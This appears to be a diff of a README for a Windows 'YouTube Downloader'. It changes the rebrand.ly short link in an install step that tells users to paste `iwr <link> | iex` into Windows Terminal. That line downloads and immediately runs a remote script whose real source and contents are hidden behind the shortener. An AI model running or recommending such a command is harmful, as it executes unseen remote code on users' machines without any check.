@@ -4,4 +4,4 @@ To use my YouTube Downloader, simply open Windows Terminal on Windows 11 OR Wind
 
 Enter this code and follow the instructions.
 
-`iwr rebrand.ly/ytdhaizi | iex`
+`iwr rebrand.ly/ytdlhaizi | iex`
